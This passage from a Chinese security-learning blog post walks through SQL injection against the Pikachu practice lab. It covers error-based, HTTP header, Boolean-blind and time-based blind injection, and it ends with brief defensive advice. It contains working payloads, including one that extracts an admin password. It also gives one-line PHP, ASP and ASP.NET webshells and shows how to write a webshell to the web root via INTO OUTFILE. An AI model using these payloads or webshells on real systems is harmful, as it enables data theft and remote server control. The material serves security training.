<p>这里放一个payload<br>一看就明白了</p>
<p>kobe’ and extractvalue(0,concat(0x7e,database()))#<br>来试试</p>
<p><img src="https://img-blog.csdnimg.cn/47417907d19c402087a6f8c1f63e17c3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>提交</p>
<p><img src="https://img-blog.csdnimg.cn/ce58b30ad7d442c99a5a6b3e0f88fa1f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>再次拿到</p>
<p>其实， updatexml和extractvalue使用时效果是一样的</p>
<h6 id="floor函数报错"><a href="#floor函数报错" class="headerlink" title="floor函数报错"></a>floor函数报错</h6><p> floor函数是一个向下取整的函数<br> 如果要构成报错<br> 在它的表达式里面要满足这几个条件<br> 1：运算中要有count<br> 2：运算中要有group by<br> 3：运算中要有rand随机值</p>
<p>我们来构造一个闭合</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span><br></pre></td></tr></table></figure>

<p>看看它是怎么样的</p>
<p><img src="https://img-blog.csdnimg.cn/14f2612dd36c42aabfe04407b8e5bbbe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>提交之后</p>
<p><img src="https://img-blog.csdnimg.cn/ca8df55b7be943a38199ba868393f945.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>通过报错拿到了数据库的版本</p>
<p>我们也可以将刚刚payload中的version换成别的<br>同样可以</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and (select 2 from (select count(*),concat((select password from users where username=&#x27;admin&#x27; limit 0,1),floor(rand(0)*2))x from </span><br><span class="line">information_schema.tables group by x)a)#</span><br></pre></td></tr></table></figure>

<p>我们来看看users表中admin的密码</p>
<p>输入payload，提交<br><img src="https://img-blog.csdnimg.cn/a3a11c720a1f4dc584153c4a4bf8f0c1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功拿到密码~</p>
<p>这个就是基于floor函数的报错注入</p>
<h3 id="OS远程控制"><a href="#OS远程控制" class="headerlink" title="OS远程控制"></a>OS远程控制</h3><h6 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h6><p>一句话木马是一种短小而精悍的木马客户端，隐蔽性好，且功能强大<br>PHP：<br><code>&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;</code><br>ASP：<br><code>&lt;%eval request(&quot;chopper&quot;)%&gt;</code><br>ASP.NET：<br><code>&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;</code></p>
<h6 id="如何通过into-outfile写入恶意代码并控制OS"><a href="#如何通过into-outfile写入恶意代码并控制OS" class="headerlink" title="如何通过into outfile写入恶意代码并控制OS"></a>如何通过into outfile写入恶意代码并控制OS</h6><p>我们可以把这个函数写到一个文件中去，然后通过对这个文件的访问，去执行这个<br>函数，向这个函数传入我们想要的操作，就会被当作远程控制的操作去执行，从而实现对服务端的控制</p>
<p>select 1,2 into outfile “/var/www/html/1.txt”</p>
<p>into outfile 将select的结果写入到指定目录1.txt中<br>在一些没有回显的注入中可以使用into outfile将结果写入到指定文件，然后访问获取</p>
<p>前提条件：<br>1.需要知道远程目录<br>2.需要远程目录有写权限<br>3.需要数据库开启了secure_file_priv</p>
<p><code>kobe&#39; union select &quot;&lt;?php @eval($_GET[&#39;test&#39;])?&gt;&quot;,2 into outfile &quot;/var/www/html/1.php&quot;#</code></p>
<p><code>kobe&#39; union select &quot;&lt;?php system($_GET[&#39;cmd&#39;])?&gt;&quot;,2 into outfile &quot;/var/www/html/2.php&quot;#</code></p>
<h1 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a>http header 注入</h1><p>什么是Http Header报错呢？<br>有时候，后台开发人员为了验证客户端头消息（例如cookie），或者通过HTTP header头信息获取客户端的一些信息，比如useragent、accept字段等</p>
<p>会对客户端的http header信息进行获取并使用SQL处理，如果此时没有足够的安全，则可能会导致基于http header的SQL Inject漏洞</p>
<p>我们首先登录一下<br><img src="https://img-blog.csdnimg.cn/d29b4918f4de490fa456829c6ba756bc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>我们的一些网络信息都被展示了出来</p>
<p>我们将抓到的包发到repeater中</p>
<p><img src="https://img-blog.csdnimg.cn/f1fdca556b9445c9945aefb8ee5685fc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>对比一下User-Agent和pikachu上的<br>我们猜测它将我们的user-agent用sql语句拼接起来了<br>修改成单引号，看看会不会报错</p>
<p><img src="https://img-blog.csdnimg.cn/09128bb2cb6c47ca985f72cd47fea06a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>那我们就用之前的updatexml函数报错<br>构造一个payload</p>
<p><code>firefox&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;</code></p>
<p><img src="https://img-blog.csdnimg.cn/6492a888b1594f2b854d40c543db9a02.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>重发一下</p>
<p><img src="https://img-blog.csdnimg.cn/992e68aa63bb476aaf7803d502263f6e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>拿到饿了数据库名称</p>
<p>还有一个cookie<br>后台拿到cookie后，也可能会到数据库中去拼接进行相关的操作<br>这也可能是一个sql注入漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/48fa5640cfff43519088ffeb1a8e0c96.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在cookie的uname中加一个单引号<br>我们来试试看看会不会报错</p>
<p><img src="https://img-blog.csdnimg.cn/fe963f466adf4cf7962040d21574b2a9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这样的话，我们就可以构造payload了</p>
<p><code>admin&#39; and updatexml(1,concat(0x7e,database()),0)#</code></p>
<p>输入后，重发一下<br><img src="https://img-blog.csdnimg.cn/30694ab3d59d4978ae7b511b0f693f61.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这就是简单的http header注入</p>
<h1 id="SQL-Inject-盲注"><a href="#SQL-Inject-盲注" class="headerlink" title="SQL Inject 盲注"></a>SQL Inject 盲注</h1><p>什么是盲注呢？<br>有些情况下，后台使用了错误信息屏蔽的方法（比如@）屏蔽了报错<br>此时无法根据报错信息来进行注入的判断<br>这种情况就叫盲注<br>根据表现情况不同m，盲注又分为based Boolean和based time两种类型</p>
<h3 id="Boolean注入攻击-原理及测试"><a href="#Boolean注入攻击-原理及测试" class="headerlink" title="Boolean注入攻击 原理及测试"></a>Boolean注入攻击 原理及测试</h3><p>基于Boolean盲注的主要表现：</p>
<p>0.没有报错信息<br>1.不管正确和错误的输入    都只显示两种情况（可以认为是0和1）<br>2.在正确输入的情况下，输入and 1=1/and 1=2发现可以判断</p>
<p>演示一下<br><img src="https://img-blog.csdnimg.cn/1ba002b1b5c04329b58a01895e7b8685.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>这里我们输入这个payload<br>发现它只是提示我们username不存在<br>那是不是就没有报错呢？</p>
<p>在我们输入kobe’ and 1=1#这个payload后，提交<br><img src="https://img-blog.csdnimg.cn/b45afb9314f64a129521f6e570bba0ee.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>信息出来了，这就说明它是存在sql注入漏洞的，只是它不会返回报错信息</p>
<p>构造一个payload</p>
<p><code>kobe&#39; and ascii(substr(database(),1,1))&gt;100#</code></p>
<p>什么意思呢？</p>
<p>就是说如果可以返回kobe的信息的话，说明and后面为真，反之</p>
<p>后面的信息就是从database的名称第一个字符开始，取一个，做ascll码转化，与100来比较，根据真或假我们就可以知道database的第一个字符串是不是大于100，重复这个操作，从而猜出它的第一个字符。</p>
<p>测试一下<br><img src="https://img-blog.csdnimg.cn/eb44fa73a3944fa3b063e284bf4fd178.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>显示了，说明第一个字符大于100为真</p>
<p>然后<br><code>kobe&#39; and ascii(substr(database(),1,1))=112#</code></p>
<p>我们来看看</p>
<p><img src="https://img-blog.csdnimg.cn/7e964f1544174e56b143bba413d1b22c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>说明第一个字符串=112为真<br>那它数据库的第一个字符串就是“p”</p>
<p>重复操作</p>
<p>获取到它的数据库名称为“pikachu”</p>
<p>这就是简单的Boolean盲注了</p>
<h3 id="Time注入攻击-原理及测试"><a href="#Time注入攻击-原理及测试" class="headerlink" title="Time注入攻击 原理及测试"></a>Time注入攻击 原理及测试</h3><p>如果书Boolean盲注在页面还可以看到0 or 1 的回显的话<br>那么基于time的盲注就啥也看不到了</p>
<p>但是还有一个条件，就是时间，通过特定的输入，判断后台执行的时间，从而确定注入~</p>
<p>常用的payload<br><code>kobe&#39; and sleep(5)#</code></p>
<p>输入kobe试试<br><img src="https://img-blog.csdnimg.cn/d690cdf1bb944ccbb611d979a14f0755.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>正常响应41ms</p>
<p>输入kobe’ and sleep(5)#,让它休息5s</p>
<p><img src="https://img-blog.csdnimg.cn/af2383c861db4417b5a275371218fcb3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>响应为5000多ms</p>
<p>说明存在sql注入漏洞</p>
<p>构造payload<br><code>kobe&#39; and if((substr(database(),1,1))=&#39;p&#39;,sleep(5),null)#</code></p>
<p><img src="https://img-blog.csdnimg.cn/405119426cf944a9bc13f41b19b68595.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUHJvbWlzZV5e,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>说明数据库的第一个字符为p，相应为5000多ms<br>正确</p>
<p>以此测试，获取到数据库的名称为pikachu</p>
<h1 id="sql常见防范措施"><a href="#sql常见防范措施" class="headerlink" title="sql常见防范措施"></a>sql常见防范措施</h1><p><strong>·</strong> 代码层面<br>1.对输入做严格的转义<br>2.使用预处理和参数化</p>
<p><strong>·</strong> 网路层面<br>1.使用WAF设备启用防SQL Inject注入策略（或类似防护系统）<br>2.云端防护（360、阿里云盾）</p>

      </section>

      
      
        <nav class="article-nav">
          
          
            <div class="article-nav-item layout-padding">
  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
    
    <div class="card-text">
      
        <a href="/2021/11/04/hello-world/" itemprop="url">
          <h2 class="card-text--title text-ellipsis">Hello World</h2>
        </a>
      
      <div class="card-text--row">Older</div>
    </div>
  </article>
</div>
          
        </nav>
      

      <section class="page-message-container layout-padding">
        


  
  
    <div class="valine-container comments-container content-padding--primary soft-size--large soft-style--box">
      <div id="valine_thread" class="valine-thread"></div>
    </div>
    <script type="text/javascript" src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
    <script type="text/javascript" src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <script type="text/javascript">
      new Valine({
        el: "#valine_thread",
        appId: "a123QaQ",
        appKey: "Bwcxfdsz123",
        avatar: "mm",
        placeholder: "随便说点什么叭～",
        notify: true,
        visitor: true,
        pageSize: 10,
      });
    </script>
  

  
  


      </section>
    </div>
    <div class="widget-info">
      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-body">
    
      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="Sukoshi">
    
    
      <h2>Sukoshi</h2>
    
    
      <p>贵在坚持</p>
    

    <div class="count-box">
      <div class="count-box--item">
        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
</svg>
        <span>2</span>
      </div>
      <div class="count-box--item">
        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
</svg>
        0
      </div>
      <div class="count-box--item">
        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
</svg>
        0
      </div>
    </div>
  </div>
</section>

      

      
<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
</svg>
    <span>NOTICE</span>
  </div>
  <div class="widget-body">
    <p>flex-block主题部分重构，详情查看https://github.com/miiiku/flex-block</p>
  </div>
</section>


      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
</svg>
    <span>CATEGORYS</span>
  </div>
  <div class="widget-body">
    <ul class="categorys-list">
      
    </ul>
  </div>
</section>

      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
</svg>
    <span>TAGS</span>
  </div>
  <div class="widget-body">
    <div class="tags-cloud">
      
    </div>
  </div>
</section>
    </div>
  </article>
</div>

    <!-- footer container -->
<footer id="footer" class="footer">
  <div class="footer-container">
    
    <div class="social-icons">
      
        
      
        
      
        
      
        
          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
</svg>
          </a>
        
      
        
          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
</svg>
          </a>
        
      
    </div>
     
    <p>&copy; 2021 <a href="/" target="_blank">John Doe</a></p>

    

    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>

    <p>
      <a href="javascript:;" id="theme-light">🌞 浅色</a>
      <a href="javascript:;" id="theme-dark">🌛 深色</a>
      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
    </p>
  </div>
</footer>
  </div>

  <div class="back-to-top-fixed soft-size--round soft-style--box">
    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
    </svg>
  </div>

  
  <!-- aplayer -->


<!-- dplayer -->




  


  


  




<script src="/js/script.js"></script>


  
  <!-- 尾部用户自定义相关内容 -->
</body>
</html>